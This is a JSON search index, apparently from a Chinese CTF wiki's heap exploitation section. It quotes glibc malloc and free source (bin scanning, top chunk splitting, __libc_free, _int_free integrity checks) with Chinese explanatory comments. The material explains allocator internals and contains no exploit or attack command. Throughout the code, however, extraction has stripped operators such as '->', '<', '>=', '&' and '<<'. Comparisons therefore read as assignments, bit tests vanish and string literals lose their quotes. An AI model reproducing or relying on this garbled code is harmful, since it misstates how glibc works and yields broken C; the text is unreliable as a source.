    } \n                     remainder - bk   =   bck ; \n                     remainder - fd   =   fwd ; \n                     bck - fd         =   remainder ; \n                     fwd - bk         =   remainder ; \n                     // \u5982\u679c\u4e0d\u5904\u4e8esmall bin\u8303\u56f4\u5185\uff0c\u5c31\u8bbe\u7f6e\u5bf9\u5e94\u7684\u5b57\u6bb5 \n                     if   ( ! in_smallbin_range ( remainder_size ))   { \n                         remainder - fd_nextsize   =   NULL ; \n                         remainder - bk_nextsize   =   NULL ; \n                     } \n                     // \u8bbe\u7f6e\u5206\u914d\u7684chunk\u7684\u6807\u8bb0 \n                     set_head ( victim , \n                              nb   |   PREV_INUSE   | \n                                  ( av   !=   main_arena   ?   NON_MAIN_ARENA   :   0 )); \n\n                     // \u8bbe\u7f6eremainder\u7684\u4e0a\u4e00\u4e2achunk\uff0c\u5373\u5206\u914d\u51fa\u53bb\u7684chunk\u7684\u4f7f\u7528\u72b6\u6001 \n                     // \u5176\u4f59\u7684\u4e0d\u7528\u7ba1\uff0c\u76f4\u63a5\u4ece\u4e0a\u9762\u7ee7\u627f\u4e0b\u6765\u4e86 \n                     set_head ( remainder ,   remainder_size   |   PREV_INUSE ); \n                     // \u8bbe\u7f6eremainder\u7684\u5927\u5c0f \n                     set_foot ( remainder ,   remainder_size ); \n                 } \n                 // \u68c0\u67e5 \n                 check_malloced_chunk ( av ,   victim ,   nb ); \n                 // \u8f6c\u6362\u4e3amem\u72b6\u6001 \n                 void   * p   =   chunk2mem ( victim ); \n                 // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff \n                 alloc_perturb ( p ,   bytes ); \n                 return   p ; \n             } \n         }", 
            "title": "large chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#chunk", 
            "text": "\u5982\u679c\u8d70\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u8bf4\u660e\u5bf9\u4e8e\u7528\u6237\u6240\u9700\u7684chunk\uff0c\u4e0d\u80fd\u76f4\u63a5\u4ece\u5176\u5bf9\u5e94\u7684\u5408\u9002\u7684bin\u4e2d\u83b7\u53d6chunk\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u6765\u67e5\u627e\u6bd4\u5f53\u524d bin \u66f4\u5927\u7684 fast bin \uff0c small bin \u6216\u8005 large bin\u3002           /*             Search for a chunk by scanning bins, starting with next largest             bin. This search is strictly by best-fit; i.e., the smallest             (with ties going to approximately the least recently used) chunk             that fits is selected.             The bitmap avoids needing to check that most blocks are nonempty.             The particular case of skipping all bins during warm-up phases             when no chunks have been returned yet is faster than it might look.           */ \n\n         ++ idx ; \n         // \u83b7\u53d6\u5bf9\u5e94\u7684bin \n         bin     =   bin_at ( av ,   idx ); \n         // \u83b7\u53d6\u5f53\u524d\u7d22\u5f15\u5728binmap\u4e2d\u7684block\u7d22\u5f15 \n         // #define idx2block(i) ((i)   BINMAPSHIFT)  ,BINMAPSHIFT=5 \n         // Binmap\u6309block\u7ba1\u7406\uff0c\u6bcf\u4e2ablock\u4e3a\u4e00\u4e2aint\uff0c\u517132\u4e2abit\uff0c\u53ef\u4ee5\u8868\u793a32\u4e2abin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2chunk\u5b58\u5728 \n         // \u6240\u4ee5\u8fd9\u91cc\u662f\u53f3\u79fb5 \n         block   =   idx2block ( idx ); \n         // \u83b7\u53d6\u5f53\u524d\u5757\u5927\u5c0f\u5bf9\u5e94\u7684\u6620\u5c04\uff0c\u8fd9\u91cc\u53ef\u4ee5\u5f97\u77e5\u76f8\u5e94\u7684bin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2\u5757 \n         map     =   av - binmap [   block   ]; \n         // #define idx2bit(i) ((1U   ((i)   ((1U   BINMAPSHIFT) - 1)))) \n         // \u5c06idx\u5bf9\u5e94\u7684\u6bd4\u7279\u4f4d\u8bbe\u7f6e\u4e3a1\uff0c\u5176\u5b83\u4f4d\u4e3a0 \n         bit     =   idx2bit ( idx ); \n         for   (;;)   {", 
            "title": "\u5bfb\u627e\u8f83\u5927 chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#map", 
            "text": "/* Skip rest of block if there are no more set bits in this block.               */ \n             // \u5982\u679cbit map\uff0c\u5219\u8868\u793a\u8be5 map \u4e2d\u6ca1\u6709\u6bd4\u5f53\u524d\u6240\u9700\u8981chunk\u5927\u7684\u7a7a\u95f2\u5757 \n             // \u5982\u679cbit\u4e3a0\uff0c\u90a3\u4e48\u8bf4\u660e\uff0c\u4e0a\u9762idx2bit\u5e26\u5165\u7684\u53c2\u6570\u4e3a0\u3002 \n             if   ( bit     map   ||   bit   ==   0 )   { \n                 do   { \n                     // \u5bfb\u627e\u4e0b\u4e00\u4e2ablock\uff0c\u76f4\u5230\u5176\u5bf9\u5e94\u7684map\u4e0d\u4e3a0\u3002 \n                     // \u5982\u679c\u5df2\u7ecf\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u90a3\u5c31\u53ea\u80fd\u4f7f\u7528top chunk\u4e86 \n                     if   ( ++ block   =   BINMAPSIZE )   /* out of bins */ \n                         goto   use_top ; \n                 }   while   (( map   =   av - binmap [   block   ])   ==   0 ); \n                 // \u83b7\u53d6\u5176\u5bf9\u5e94\u7684bin\uff0c\u56e0\u4e3a\u8be5map\u4e2d\u7684chunk\u5927\u5c0f\u90fd\u6bd4\u6240\u9700\u7684chunk\u5927\uff0c\u800c\u4e14 \n                 // map\u672c\u8eab\u4e0d\u4e3a0\uff0c\u6240\u4ee5\u5fc5\u7136\u5b58\u5728\u6ee1\u8db3\u9700\u6c42\u7684chunk\u3002 \n                 bin   =   bin_at ( av ,   ( block     BINMAPSHIFT )); \n                 bit   =   1 ; \n             }", 
            "title": "\u627e\u5230\u4e00\u4e2a\u5408\u9002\u7684 map"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#bin", 
            "text": "/* Advance to bin with set bit. There must be one. */ \n             // \u4ece\u5f53\u524dmap\u7684\u6700\u5c0f\u7684bin\u4e00\u76f4\u627e\uff0c\u76f4\u5230\u627e\u5230\u5408\u9002\u7684bin\u3002 \n             // \u8fd9\u91cc\u662f\u4e00\u5b9a\u5b58\u5728\u7684 \n             while   (( bit     map )   ==   0 )   { \n                 bin   =   next_bin ( bin ); \n                 bit   =   1 ; \n                 assert ( bit   !=   0 ); \n             }", 
            "title": "\u627e\u5230\u5408\u9002\u7684 bin"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#chunk_1", 
            "text": "/* Inspect the bin. It is likely to be non-empty */ \n             // \u83b7\u53d6\u5bf9\u5e94\u7684bin \n             victim   =   last ( bin ); \n\n             /*  If a false alarm (empty bin), clear the bit. */ \n             // \u5982\u679cvictim=bin\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5c06map\u5bf9\u5e94\u7684\u4f4d\u6e050\uff0c\u7136\u540e\u83b7\u53d6\u4e0b\u4e00\u4e2abin \n             // \u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\u7684\u6982\u7387\u5e94\u8be5\u5f88\u5c0f\u3002 \n             if   ( victim   ==   bin )   { \n                 av - binmap [   block   ]   =   map   =   ~ bit ;   /* Write through */ \n                 bin                   =   next_bin ( bin ); \n                 bit   =   1 ; \n             }", 
            "title": "\u7b80\u5355\u68c0\u67e5 chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#chunk_2", 
            "text": "else   { \n                 // \u83b7\u53d6\u5bf9\u5e94victim\u7684\u5927\u5c0f \n                 size   =   chunksize ( victim ); \n\n                 /*  We know the first chunk in this bin is big enough to use. */ \n                 assert (( unsigned   long )   ( size )   =   ( unsigned   long )   ( nb )); \n                 // \u8ba1\u7b97\u5206\u5272\u540e\u5269\u4f59\u7684\u5927\u5c0f \n                 remainder_size   =   size   -   nb ; \n\n                 /* unlink */ \n                 unlink ( av ,   victim ,   bck ,   fwd ); \n\n                 /* Exhaust */ \n                 // \u5982\u679c\u5206\u5272\u540e\u4e0d\u591f\u4e00\u4e2achunk\u600e\u4e48\u529e\uff1f \n                 if   ( remainder_size     MINSIZE )   { \n                     set_inuse_bit_at_offset ( victim ,   size ); \n                     if   ( av   !=   main_arena )   set_non_main_arena ( victim ); \n                 } \n\n                 /* Split */ \n                 // \u5982\u679c\u591f\uff0c\u5c3d\u7ba1\u5206\u5272 \n                 else   { \n                     // \u8ba1\u7b97\u5269\u4f59\u7684chunk\u7684\u504f\u79fb \n                     remainder   =   chunk_at_offset ( victim ,   nb ); \n\n                     /* We cannot assume the unsorted list is empty and therefore                         have to perform a complete insert here.  */ \n                     // \u5c06\u5269\u4f59\u7684chunk\u63d2\u5165\u5230unsorted bin\u4e2d \n                     bck   =   unsorted_chunks ( av ); \n                     fwd   =   bck - fd ; \n                     if   ( __glibc_unlikely ( fwd - bk   !=   bck ))   { \n                         errstr   =   malloc(): corrupted unsorted chunks 2 ; \n                         goto   errout ; \n                     } \n                     remainder - bk   =   bck ; \n                     remainder - fd   =   fwd ; \n                     bck - fd         =   remainder ; \n                     fwd - bk         =   remainder ; \n\n                     /* advertise as last remainder */ \n                     // \u5982\u679c\u5728small bin\u8303\u56f4\u5185\uff0c\u5c31\u5c06\u5176\u6807\u8bb0\u4e3aremainder \n                     if   ( in_smallbin_range ( nb ))   av - last_remainder   =   remainder ; \n                     if   ( ! in_smallbin_range ( remainder_size ))   { \n                         remainder - fd_nextsize   =   NULL ; \n                         remainder - bk_nextsize   =   NULL ; \n                     } \n                     // \u8bbe\u7f6evictim\u7684\u4f7f\u7528\u72b6\u6001 \n                     set_head ( victim , \n                              nb   |   PREV_INUSE   | \n                                  ( av   !=   main_arena   ?   NON_MAIN_ARENA   :   0 )); \n                     // \u8bbe\u7f6eremainder\u7684\u4f7f\u7528\u72b6\u6001\uff0c\u8fd9\u91cc\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f \n                     set_head ( remainder ,   remainder_size   |   PREV_INUSE ); \n                     // \u8bbe\u7f6eremainder\u7684\u5927\u5c0f \n                     set_foot ( remainder ,   remainder_size ); \n                 } \n                 // \u68c0\u67e5 \n                 check_malloced_chunk ( av ,   victim ,   nb ); \n                 // chunk\u72b6\u6001\u8f6c\u6362\u5230mem\u72b6\u6001 \n                 void   * p   =   chunk2mem ( victim ); \n                 // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff \n                 alloc_perturb ( p ,   bytes ); \n                 return   p ; \n             }", 
            "title": "\u771f\u6b63\u53d6\u51fachunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#top-chunk", 
            "text": "\u5982\u679c\u6240\u6709\u7684 bin \u4e2d\u7684 chunk \u90fd\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u6ee1\u8db3\u8981\u6c42\uff08\u5373\u4e0d\u5408\u5e76\uff09\uff0c\u6216\u8005\u8bf4\u90fd\u6ca1\u6709\u7a7a\u95f2\u7684 chunk\u3002\u90a3\u4e48\u6211\u4eec\u5c31\u53ea\u80fd\u4f7f\u7528 top chunk \u4e86\u3002       use_top : \n         /*             If large enough, split off the chunk bordering the end of memory             (held in av- top). Note that this is in accord with the best-fit             search rule.  In effect, av- top is treated as larger (and thus             less well fitting) than any other available chunk since it can             be extended to be as large as necessary (up to system             limitations).             We require that av- top always exists (i.e., has size  =             MINSIZE) after initialization, so if it would otherwise be             exhausted by current request, it is replenished. (The main             reason for ensuring it exists is that we may need MINSIZE space             to put in fenceposts in sysmalloc.)           */ \n         // \u83b7\u53d6\u5f53\u524d\u7684top chunk\uff0c\u5e76\u8ba1\u7b97\u5176\u5bf9\u5e94\u7684\u5927\u5c0f \n         victim   =   av - top ; \n         size     =   chunksize ( victim ); \n         // \u5982\u679c\u5206\u5272\u4e4b\u540e\uff0ctop chunk \u5927\u5c0f\u4ecd\u7136\u6ee1\u8db3 chunk \u7684\u6700\u5c0f\u5927\u5c0f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u5272\u3002 \n         if   (( unsigned   long )   ( size )   =   ( unsigned   long )   ( nb   +   MINSIZE ))   { \n             remainder_size   =   size   -   nb ; \n             remainder        =   chunk_at_offset ( victim ,   nb ); \n             av - top          =   remainder ; \n             // \u8fd9\u91cc\u8bbe\u7f6e PREV_INUSE \u662f\u56e0\u4e3a top chunk \u7684 chunk \u5982\u679c\u4e0d\u662f fastbin\uff0c\u5c31\u5fc5\u7136\u4f1a\u548c \n             // top chunk \u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u8bbe\u7f6e\u4e86 PREV_INUSE\u3002 \n             set_head ( victim ,   nb   |   PREV_INUSE   | \n                                  ( av   !=   main_arena   ?   NON_MAIN_ARENA   :   0 )); \n             set_head ( remainder ,   remainder_size   |   PREV_INUSE ); \n\n             check_malloced_chunk ( av ,   victim ,   nb ); \n             void   * p   =   chunk2mem ( victim ); \n             alloc_perturb ( p ,   bytes ); \n             return   p ; \n         } \n         // \u5426\u5219\uff0c\u5224\u65ad\u662f\u5426\u6709 fast chunk \n         /* When we are using atomic ops to free fast chunks we can get             here for all block sizes.  */ \n         else   if   ( have_fastchunks ( av ))   { \n             // \u5148\u6267\u884c\u4e00\u6b21fast bin\u7684\u5408\u5e76 \n             malloc_consolidate ( av ); \n             /* restore original bin index */ \n             // \u5224\u65ad\u9700\u8981\u7684chunk\u662f\u5728small bin\u8303\u56f4\u5185\u8fd8\u662flarge bin\u8303\u56f4\u5185 \n             // \u5e76\u8ba1\u7b97\u5bf9\u5e94\u7684\u7d22\u5f15 \n             // \u7b49\u5f85\u4e0b\u6b21\u518d\u770b\u770b\u662f\u5426\u53ef\u4ee5 \n             if   ( in_smallbin_range ( nb )) \n                 idx   =   smallbin_index ( nb ); \n             else \n                 idx   =   largebin_index ( nb ); \n         } \n\n         /*             Otherwise, relay to handle system-dependent cases           */ \n         // \u5426\u5219\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ea\u80fd\u4ece\u7cfb\u7edf\u4e2d\u518d\u6b21\u7533\u8bf7\u4e00\u70b9\u5185\u5b58\u4e86\u3002 \n         else   { \n             void   * p   =   sysmalloc ( nb ,   av ); \n             if   ( p   !=   NULL )   alloc_perturb ( p ,   bytes ); \n             return   p ; \n         }", 
            "title": "\u4f7f\u7528 top chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_libc_calloc", 
            "text": "calloc \u4e5f\u662f libc \u4e2d\u7684\u4e00\u79cd\u7533\u8bf7\u5185\u5b58\u5757\u7684\u51fd\u6570\u3002\u5728  libc \u4e2d\u7684\u5305\u88c5\u4e3a  _libc_calloc \uff0c\u5177\u4f53\u4ecb\u7ecd\u5982\u4e0b  /*    calloc(size_t n_elements, size_t element_size);    Returns a pointer to n_elements * element_size bytes, with all locations    set to zero.  */  void *    __libc_calloc ( size_t ,   size_t );", 
            "title": "_libc_calloc"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#sysmalloc", 
            "text": "\u6709\u65f6\u95f4\u7684\u65f6\u5019\u518d\u5206\u6790\u3002", 
            "title": "sysmalloc"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_10", 
            "text": "", 
            "title": "\u91ca\u653e\u5185\u5b58\u5757"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#__libc_free", 
            "text": "\u7c7b\u4f3c\u4e8e malloc\uff0cfree \u51fd\u6570\u4e5f\u6709\u4e00\u5c42\u5c01\u88c5\uff0c\u547d\u540d\u683c\u5f0f\u4e0e malloc \u57fa\u672c\u7c7b\u4f3c\u3002\u4ee3\u7801\u5982\u4e0b  void   __libc_free ( void   * mem )   { \n     mstate      ar_ptr ; \n     mchunkptr   p ;   /* chunk corresponding to mem */ \n     // \u5224\u65ad\u662f\u5426\u6709\u94a9\u5b50\u51fd\u6570 __free_hook \n     void   ( * hook )( void   * ,   const   void   * )   =   atomic_forced_read ( __free_hook ); \n     if   ( __builtin_expect ( hook   !=   NULL ,   0 ))   { \n         ( * hook )( mem ,   RETURN_ADDRESS ( 0 )); \n         return ; \n     } \n     // free NULL\u6ca1\u6709\u4f5c\u7528 \n     if   ( mem   ==   0 )   /* free(0) has no effect */ \n         return ; \n     // \u5c06mem\u8f6c\u6362\u4e3achunk\u72b6\u6001 \n     p   =   mem2chunk ( mem ); \n     // \u5982\u679c\u8be5\u5757\u5185\u5b58\u662fmmap\u5f97\u5230\u7684 \n     if   ( chunk_is_mmapped ( p ))   /* release mmapped memory. */ \n     { \n         /* See if the dynamic brk/mmap threshold needs adjusting.         Dumped fake mmapped chunks do not affect the threshold.  */ \n         if   ( ! mp_ . no_dyn_threshold     chunksize_nomask ( p )     mp_ . mmap_threshold   \n             chunksize_nomask ( p )   =   DEFAULT_MMAP_THRESHOLD_MAX   \n             ! DUMPED_MAIN_ARENA_CHUNK ( p ))   { \n             mp_ . mmap_threshold   =   chunksize ( p ); \n             mp_ . trim_threshold   =   2   *   mp_ . mmap_threshold ; \n             LIBC_PROBE ( memory_mallopt_free_dyn_thresholds ,   2 , \n                        mp_ . mmap_threshold ,   mp_ . trim_threshold ); \n         } \n         munmap_chunk ( p ); \n         return ; \n     } \n     // \u6839\u636echunk\u83b7\u5f97\u5206\u914d\u533a\u7684\u6307\u9488 \n     ar_ptr   =   arena_for_chunk ( p ); \n     // \u6267\u884c\u91ca\u653e \n     _int_free ( ar_ptr ,   p ,   0 );  }", 
            "title": "__libc_free"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_int_free", 
            "text": "\u51fd\u6570\u521d\u59cb\u65f6\u523b\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u7684\u53d8\u91cf\uff0c\u5e76\u4e14\u5f97\u5230\u4e86\u7528\u6237\u60f3\u8981\u91ca\u653e\u7684 chunk \u7684\u5927\u5c0f  static   void   _int_free ( mstate   av ,   mchunkptr   p ,   int   have_lock )   { \n     INTERNAL_SIZE_T   size ;        /* its size */ \n     mfastbinptr   *     fb ;          /* associated fastbin */ \n     mchunkptr         nextchunk ;   /* next contiguous chunk */ \n     INTERNAL_SIZE_T   nextsize ;    /* its size */ \n     int               nextinuse ;   /* true if nextchunk is used */ \n     INTERNAL_SIZE_T   prevsize ;    /* size of previous contiguous chunk */ \n     mchunkptr         bck ;         /* misc temp for linking */ \n     mchunkptr         fwd ;         /* misc temp for linking */ \n\n     const   char   * errstr   =   NULL ; \n     int           locked   =   0 ; \n\n     size   =   chunksize ( p );", 
            "title": "_int_free"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_11", 
            "text": "/* Little security check which won t hurt performance: the         allocator never wrapps around at the end of the address space.         Therefore we can exclude some size values which might appear         here by accident or by  design  from some intruder.  */ \n     // \u6307\u9488\u4e0d\u80fd\u6307\u5411\u975e\u6cd5\u7684\u5730\u5740, \u5fc5\u987b\u5c0f\u4e8e\u7b49\u4e8e-size\uff0c\u4e3a\u4ec0\u4e48\uff1f\uff1f\uff1f \n     // \u6307\u9488\u5fc5\u987b\u5f97\u5bf9\u9f50\uff0c2*SIZE_SZ \u8fd9\u4e2a\u5bf9\u9f50\u5f97\u4ed4\u7ec6\u60f3\u60f3 \n     if   ( __builtin_expect (( uintptr_t )   p     ( uintptr_t )   - size ,   0 )   || \n         __builtin_expect ( misaligned_chunk ( p ),   0 ))   { \n         errstr   =   free(): invalid pointer ; \n     errout : \n         if   ( ! have_lock     locked )   __libc_lock_unlock ( av - mutex ); \n         malloc_printerr ( check_action ,   errstr ,   chunk2mem ( p ),   av ); \n         return ; \n     } \n     /* We know that each chunk is at least MINSIZE bytes in size or a         multiple of MALLOC_ALIGNMENT.  */ \n     // \u5927\u5c0f\u6ca1\u6709\u6700\u5c0f\u7684chunk\u5927\uff0c\u6216\u8005\u8bf4\uff0c\u5927\u5c0f\u4e0d\u662fMALLOC_ALIGNMENT\u7684\u6574\u6570\u500d \n     if   ( __glibc_unlikely ( size     MINSIZE   ||   ! aligned_OK ( size )))   { \n         errstr   =   free(): invalid size ; \n         goto   errout ; \n     } \n     // \u68c0\u67e5\u8be5chunk\u662f\u5426\u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 \n     check_inuse_chunk ( av ,   p );   \u5176\u4e2d  /* Check if m has acceptable alignment */  #define aligned_OK(m) (((unsigned long) (m)  MALLOC_ALIGN_MASK) == 0)  #define misaligned_chunk(p)                                                    \\      ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p))         \\       MALLOC_ALIGN_MASK)", 
            "title": "\u7b80\u5355\u7684\u68c0\u67e5"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#fast-bin_1", 
            "text": "\u5982\u679c\u4e0a\u8ff0\u68c0\u67e5\u90fd\u5408\u683c\u7684\u8bdd\uff0c\u5224\u65ad\u5f53\u524d\u7684 bin \u662f\u4e0d\u662f\u5728 fast bin \u8303\u56f4\u5185\uff0c\u5728\u7684\u8bdd\u5c31\u63d2\u5165\u5230  fastbin \u5934\u90e8 \uff0c\u5373\u6210\u4e3a\u5bf9\u5e94 fastbin \u94fe\u8868\u7684 \u7b2c\u4e00\u4e2a free chunk \u3002       /*        If eligible, place chunk on a fastbin so it can be found        and used quickly in malloc.      */ \n\n     if   (( unsigned   long )   ( size )   =   ( unsigned   long )   ( get_max_fast ())  #if TRIM_FASTBINS \n         /*        If TRIM_FASTBINS set, don t place chunks        bordering top into fastbins          */ \n        //\u9ed8\u8ba4 #define TRIM_FASTBINS 0\uff0c\u56e0\u6b64\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0b\u9762\u7684\u8bed\u53e5\u4e0d\u4f1a\u6267\u884c \n        // \u5982\u679c\u5f53\u524dchunk\u662ffast chunk\uff0c\u5e76\u4e14\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u5219\u4e0d\u80fd\u63d2\u5165 \n           ( chunk_at_offset ( p ,   size )   !=   av - top )  #endif \n             )   { \n         // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5c0f\u4e8e\u4e24\u500d\u7684SIZE_SZ,\u5e76\u4e14 \n         // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5927\u4e8esystem_mem\uff0c \u4e00\u822c\u4e3a132k \n         // \u5982\u679c\u51fa\u73b0\u8fd9\u6837\u7684\u60c5\u51b5\uff0c\u5c31\u62a5\u9519\u3002 \n         if   ( __builtin_expect ( \n                 chunksize_nomask ( chunk_at_offset ( p ,   size ))   =   2   *   SIZE_SZ ,   0 )   || \n             __builtin_expect ( \n                 chunksize ( chunk_at_offset ( p ,   size ))   =   av - system_mem ,   0 ))   { \n             /* We might not have a lock at this point and concurrent                 modifications                 of system_mem might have let to a false positive.  Redo the test                 after getting the lock.  */ \n             if   ( have_lock   ||   ({ \n                     assert ( locked   ==   0 ); \n                     __libc_lock_lock ( av - mutex ); \n                     locked   =   1 ; \n                     chunksize_nomask ( chunk_at_offset ( p ,   size ))   =   2   *   SIZE_SZ   || \n                         chunksize ( chunk_at_offset ( p ,   size ))   =   av - system_mem ; \n                 }))   { \n                 errstr   =   free(): invalid next size (fast) ; \n                 goto   errout ; \n             } \n             if   ( ! have_lock )   { \n                 __libc_lock_unlock ( av - mutex ); \n                 locked   =   0 ; \n             } \n         } \n         // \u5c06chunk\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte  \n         free_perturb ( chunk2mem ( p ),   size   -   2   *   SIZE_SZ ); \n         // \u8bbe\u7f6efast chunk\u7684\u6807\u8bb0\u4f4d \n         set_fastchunks ( av ); \n         // \u6839\u636e\u5927\u5c0f\u83b7\u53d6fast bin\u7684\u7d22\u5f15 \n         unsigned   int   idx   =   fastbin_index ( size ); \n         // \u83b7\u53d6\u5bf9\u5e94fastbin\u7684\u5934\u6307\u9488\uff0c\u88ab\u521d\u59cb\u5316\u540e\u4e3aNULL\u3002 \n         fb                 =   fastbin ( av ,   idx ); \n\n         /* Atomically link P to its fastbin: P- FD = *FB; *FB = P;  */ \n         // \u4f7f\u7528\u539f\u5b50\u64cd\u4f5c\u5c06P\u63d2\u5165\u5230\u94fe\u8868\u4e2d \n         mchunkptr      old       =   * fb ,   old2 ; \n         unsigned   int   old_idx   =   ~ 0u ; \n         do   { \n             /* Check that the top of the bin is not the record we are going to                 add                 (i.e., double free).  */ \n             // so we can not double free one fastbin chunk \n             // \u9632\u6b62\u5bf9 fast bin double free \n             if   ( __builtin_expect ( old   ==   p ,   0 ))   { \n                 errstr   =   double free or corruption (fasttop) ; \n                 goto   errout ; \n             } \n             /* Check that size of fastbin chunk at the top is the same as                 size of the chunk that we are adding.  We can dereference OLD                 only if we have the lock, otherwise it might have already been                 deallocated.  See use of OLD_IDX below for the actual check.  */ \n             if   ( have_lock     old   !=   NULL ) \n                 old_idx   =   fastbin_index ( chunksize ( old )); \n             p - fd   =   old2   =   old ; \n         }   while   (( old   =   catomic_compare_and_exchange_val_rel ( fb ,   p ,   old2 ))   != \n                  old2 ); \n         // \u786e\u4fddfast bin\u7684\u52a0\u5165\u524d\u4e0e\u52a0\u5165\u540e\u76f8\u540c \n         if   ( have_lock     old   !=   NULL     __builtin_expect ( old_idx   !=   idx ,   0 ))   { \n             errstr   =   invalid fastbin entry (free) ; \n             goto   errout ; \n         } \n     }", 
            "title": "fast bin"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#mmap-chunk", 
            "text": "\u53ea\u6709\u4e0d\u662f fast bin \u7684\u60c5\u51b5\u4e0b\u624d\u4f1a\u89e6\u53d1unlink  \u9996\u5148\u6211\u4eec\u5148\u8bf4\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u4f1a\u5408\u5e76chunk\uff0c\u8fd9\u662f\u4e3a\u4e86\u907f\u514dheap\u4e2d\u6709\u592a\u591a\u96f6\u96f6\u788e\u788e\u7684\u5185\u5b58\u5757\uff0c\u5408\u5e76\u4e4b\u540e\u53ef\u4ee5\u7528\u6765\u5e94\u5bf9\u66f4\u5927\u7684\u5185\u5b58\u5757\u8bf7\u6c42\u3002\u5408\u5e76\u7684\u4e3b\u8981\u987a\u5e8f\u4e3a   \u5148\u8003\u8651\u7269\u7406\u4f4e\u5730\u5740\u7a7a\u95f2\u5757  \u540e\u8003\u8651\u7269\u7406\u9ad8\u5730\u5740\u7a7a\u95f2\u5757   \u5408\u5e76\u540e\u7684 chunk \u6307\u5411\u5408\u5e76\u7684 chunk \u7684\u4f4e\u5730\u5740\u3002  \u5728\u6ca1\u6709\u9501\u7684\u60c5\u51b5\u4e0b\uff0c\u5148\u83b7\u5f97\u9501\u3002       /*        Consolidate other non-mmapped chunks as they arrive.      */ \n\n     else   if   ( ! chunk_is_mmapped ( p ))   { \n         if   ( ! have_lock )   { \n             __libc_lock_lock ( av - mutex ); \n             locked   =   1 ; \n         } \n         nextchunk   =   chunk_at_offset ( p ,   size );", 
            "title": "\u5408\u5e76\u975e mmap \u7684\u7a7a\u95f2 chunk"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_12", 
            "text": "/* Lightweight tests: check whether the block is already the             top block.  */ \n         // \u5f53\u524dfree\u7684chunk\u4e0d\u80fd\u662ftop chunk \n         if   ( __glibc_unlikely ( p   ==   av - top ))   { \n             errstr   =   double free or corruption (top) ; \n             goto   errout ; \n         } \n         // \u5f53\u524dfree\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u4e0d\u80fd\u8d85\u8fc7arena\u7684\u8fb9\u754c \n         /* Or whether the next chunk is beyond the boundaries of the arena.  */ \n         if   ( __builtin_expect ( contiguous ( av )   \n                                  ( char   * )   nextchunk   = \n                                      (( char   * )   av - top   +   chunksize ( av - top )), \n                              0 ))   { \n             errstr   =   double free or corruption (out) ; \n             goto   errout ; \n         } \n         // \u5f53\u524d\u8981free\u7684chunk\u7684\u4f7f\u7528\u6807\u8bb0\u6ca1\u6709\u88ab\u6807\u8bb0\uff0cdouble free \n         /* Or whether the block is actually not marked used.  */ \n         if   ( __glibc_unlikely ( ! prev_inuse ( nextchunk )))   { \n             errstr   =   double free or corruption (!prev) ; \n             goto   errout ; \n         } \n         // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f \n         nextsize   =   chunksize ( nextchunk ); \n         // next chunk size valid check \n         // \u5224\u65ad\u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u662f\u5426\u4e0d\u5927\u4e8e2*SIZE_SZ\uff0c\u6216\u8005 \n         // nextsize\u662f\u5426\u5927\u4e8e\u7cfb\u7edf\u53ef\u63d0\u4f9b\u7684\u5185\u5b58 \n         if   ( __builtin_expect ( chunksize_nomask ( nextchunk )   =   2   *   SIZE_SZ ,   0 )   || \n             __builtin_expect ( nextsize   =   av - system_mem ,   0 ))   { \n             errstr   =   free(): invalid next size (normal) ; \n             goto   errout ; \n         }", 
            "title": "\u8f7b\u91cf\u7ea7\u7684\u68c0\u6d4b"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_13", 
            "text": "//\u5c06\u6307\u9488\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte  \n         free_perturb ( chunk2mem ( p ),   size   -   2   *   SIZE_SZ );", 
            "title": "\u91ca\u653e\u586b\u5145"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#-chunk", 
